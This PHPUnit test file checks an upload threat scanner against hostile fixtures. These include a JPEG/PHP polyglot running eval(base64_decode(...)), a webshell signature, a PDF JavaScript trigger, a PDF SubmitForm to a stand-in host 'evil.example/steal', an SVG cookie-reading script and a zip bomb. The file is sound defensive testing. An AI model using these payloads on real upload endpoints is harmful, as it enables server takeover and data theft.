<?php

declare(strict_types=1);

namespace Tests\Security;

use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;
use Src\Exceptions\ValidationException;
use Src\Security\SovereignThreatEngine;

class SovereignThreatEngineTest extends TestCase
{
    private string $tempDir;

    protected function setUp(): void
    {
        parent::setUp();
        $this->tempDir = sys_get_temp_dir() . '/threat_test_' . uniqid();
        mkdir($this->tempDir, 0777, true);
    }

    protected function tearDown(): void
    {
        if (is_dir($this->tempDir)) {
            $files = glob($this->tempDir . '/*');
            if (is_array($files)) {
                foreach ($files as $f) {
                    if (is_file($f)) {
                        @unlink($f);
                    }
                }
            }
            @rmdir($this->tempDir);
        }
        parent::tearDown();
    }

    #[Test]
    public function it_clears_valid_clean_jpeg_file(): void
    {
        $path = $this->tempDir . '/valid.jpg';
        // Minimal valid JPEG stream: SOI (FF D8 FF) + APP0 + EOI (FF D9)
        file_put_contents($path, "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9");

        $report = SovereignThreatEngine::scan($path, 'valid.jpg', 'jpg');

        $this->assertTrue($report['clean']);
        $this->assertSame('jpg', $report['extension']);
        $this->assertNotEmpty($report['sha256']);
    }

    #[Test]
    public function it_rejects_extension_mismatch_or_magic_byte_spoofing(): void
    {
        $path = $this->tempDir . '/fake.png';
        file_put_contents($path, "This is plain text pretending to be a PNG");

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - File header does not match declared format');

        SovereignThreatEngine::scan($path, 'fake.png', 'png');
    }

    #[Test]
    public function it_detects_and_annihilates_embedded_php_polyglot_payload(): void
    {
        $path = $this->tempDir . '/polyglot.jpg';
        // Valid JPEG header followed by hidden PHP execution wrapper
        $payload = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            . "some benign metadata padding here..."
            . "<?php eval(base64_decode('c3lzdGVtKCdpZDMnKTs=')); ?>\xFF\xD9";
        file_put_contents($path, $payload);

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - Malicious executable polyglot or webshell payload detected.');

        try {
            SovereignThreatEngine::scan($path, 'polyglot.jpg', 'jpg');
        } finally {
            $this->assertFileDoesNotExist($path, 'Malicious file must be unlinked upon detection.');
        }
    }

    #[Test]
    public function it_detects_webshell_signature(): void
    {
        $path = $this->tempDir . '/webshell.jpg';
        $payload = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00" . "c99shell backdoor code here\xFF\xD9";
        file_put_contents($path, $payload);

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - Malicious executable polyglot or webshell payload detected.');

        SovereignThreatEngine::scan($path, 'webshell.jpg', 'jpg');
    }

    #[Test]
    public function it_detects_malicious_pdf_javascript_triggers(): void
    {
        $path = $this->tempDir . '/exploit.pdf';
        $payload = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('pwned')) >> >>\nendobj\n";
        file_put_contents($path, $payload);

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - Malicious active PDF script or launch object detected.');

        SovereignThreatEngine::scan($path, 'exploit.pdf', 'pdf');
    }

    #[Test]
    public function it_allows_benign_pdf_open_action_viewer_destination(): void
    {
        $path = $this->tempDir . '/statement.pdf';
        $payload = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>\nendobj\n";
        file_put_contents($path, $payload);

        putenv('CLAMAV_SOCKET=/nonexistent/clamd.ctl');
        putenv('CLAMAV_HOST=');

        $report = SovereignThreatEngine::scan($path, 'statement.pdf', 'pdf');

        $this->assertTrue($report['clean']);
    }

    #[Test]
    public function it_blocks_malicious_pdf_open_action_submit_form(): void
    {
        $path = $this->tempDir . '/submit_exploit.pdf';
        $payload = "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /SubmitForm /F (https://evil.example/steal) >> >>\nendobj\n";
        file_put_contents($path, $payload);

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - Malicious active PDF script or launch object detected.');

        SovereignThreatEngine::scan($path, 'submit_exploit.pdf', 'pdf');
    }

    #[Test]
    public function it_detects_svg_script_injections(): void
    {
        $path = $this->tempDir . '/vector.svg';
        $payload = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>';
        file_put_contents($path, $payload);

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - Dangerous XML entity or script trigger detected in SVG vector.');

        SovereignThreatEngine::scan($path, 'vector.svg', 'svg');
    }

    #[Test]
    public function it_handles_offline_clamav_daemon_gracefully(): void
    {
        $path = $this->tempDir . '/clean.pdf';
        file_put_contents($path, "%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n");

        putenv('CLAMAV_SOCKET=/nonexistent/clamd.ctl');
        putenv('CLAMAV_HOST=');

        $report = SovereignThreatEngine::scan($path, 'clean.pdf', 'pdf');

        $this->assertTrue($report['clean']);
        $this->assertSame('skipped', $report['clamav']['status']);
    }

    #[Test]
    public function it_detects_and_blocks_zip_bomb_compression_ratio_in_office_archives(): void
    {
        if (!class_exists(\ZipArchive::class)) {
            $this->markTestSkipped('ZipArchive extension not installed.');
        }

        $path = $this->tempDir . '/bomb.docx';
        $zip = new \ZipArchive();
        $zip->open($path, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
        // 5 MB of repeated zeroes compresses to ~5 KB (> 100:1 compression ratio)
        $zip->addFromString('word/document.xml', str_repeat('0', 5_000_000));
        $zip->close();

        $this->expectException(ValidationException::class);
        $this->expectExceptionMessage('SECURITY VIOLATION - Archive decompression ratio or uncompressed payload size exceeds safety limits.');

        SovereignThreatEngine::scan($path, 'bomb.docx', 'docx');
    }
}
